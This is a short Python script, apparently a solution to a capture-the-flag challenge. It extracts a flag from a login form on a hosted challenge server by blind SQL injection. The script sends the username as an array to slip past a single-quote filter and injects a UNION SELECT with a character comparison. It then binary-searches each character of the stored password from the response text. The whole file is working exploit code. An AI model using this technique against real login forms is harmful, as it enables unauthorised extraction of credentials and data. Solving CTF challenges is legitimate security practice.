import requests

# url = 'http://localhost:3002/login'
url = 'https://sao.h4ck3r.quest/login'

flag = "FLAG"

while flag[-1] != "}":
    L, R = 1, int(500000)
    idx = len(flag) + 1

    while R - L > 1:
        # character escape
        myip = '\'111.241.152.21\''

        # 1. Pass array to bypass single quote filter
        # 2. Blind sql injection
        mid = (R + L) // 2
        obj = {'username': [f'\' UNION SELECT password, \'abcd\', {myip} from users where unicode(substr(password,{idx},1)) < {mid}; --', 'gg'], 'password': 'abcd' }
        res = requests.post(url, data = obj)

        # success
        if res.text.find("STARBURST") == -1:
            R = mid
        else:
            L = mid
    # print("l: ", L)
    flag += chr(L)
    print(flag)
    